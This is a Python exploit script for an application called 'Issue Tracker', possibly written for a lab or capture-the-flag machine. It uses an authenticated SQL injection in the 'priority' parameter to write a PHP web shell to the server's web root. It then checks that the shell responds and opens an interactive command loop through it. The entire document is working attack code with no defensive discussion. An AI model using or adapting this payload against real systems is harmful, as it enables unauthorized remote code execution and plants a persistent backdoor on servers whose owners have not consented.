#!/usr/bin/env python3
# Title: "Issue Tracker" Authenticated Remote Code Execution Via SQL Injection
# Author: Jessi
# Abuses an oversight in "Issue Tracker" to exploit a SQLi vuln and write a PHP backdoor
# Usage: python3 issue_rce.py <target_ip> <jsessionid_cookie>


import requests
import os
import sys
import time


# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 issue_rce.py <target_ip> <jessionid_cookie>")
    exit(1)


# Target IP and Valid JSESSIONID
target = sys.argv[1]
cookie = sys.argv[2]


# POST Request
payload = '''High' UNION SELECT "<?php echo exec($_GET['cmd']); ?>" INTO OUTFILE "/srv/http/jes.php"; --  '''
data = {'priority':payload}
cookies = {'JSESSIONID':cookie}
url = f'http://{target}:17445/issue/checkByPriority'



# Write Shell
print("[!] Sending Payload")
requests.post(url,cookies=cookies,data=data)
time.sleep(2)
print("[+] Payload Sent")


# Define Shell Interface
shell_url = f'http://{target}:30455/jes.php'


# Check Shell
c = requests.get(shell_url)
if c.status_code == 200:
    print("[+] Exploit Success")
else:
    print("[x] Exploit Failed")
    exit(0)


# Shell Handler
print("[+] Spawning Shell")
def shell(shell_url):
    cmd = input("issue $> ")
    if cmd == 'exit':
        exit(0)
    if cmd == 'clear':
        os.system('clear')
    r = requests.get(f'{shell_url}?cmd={cmd}')
    print(r.text)


# Exploit
while True:
    shell(shell_url)
